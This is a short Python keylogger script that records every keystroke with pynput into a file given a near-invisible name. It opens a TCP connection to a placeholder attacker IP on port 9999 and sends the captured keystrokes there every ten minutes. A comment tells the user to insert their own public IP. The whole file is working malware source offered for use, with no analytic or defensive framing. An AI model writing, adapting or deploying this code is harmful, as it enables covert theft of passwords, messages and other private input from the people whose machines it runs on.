from pynput import keyboard
import socket
import time

def keypressed(key):
    with open("ㅤ.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
                if str(key) == "Key.space":
                    logKey.write(" ")

if __name__ == "__main__":
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("yyy.yyy.yyy.yyy", 9999)) #Here instead of yyy.yyy... put your public ip address (you also need port configuration)
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    while 1:
        time.sleep(600) #wait 10 minutes before sending another file.
        file = open("ㅤ.txt", 'rb')
        data = file.read()
        client.sendall(data)

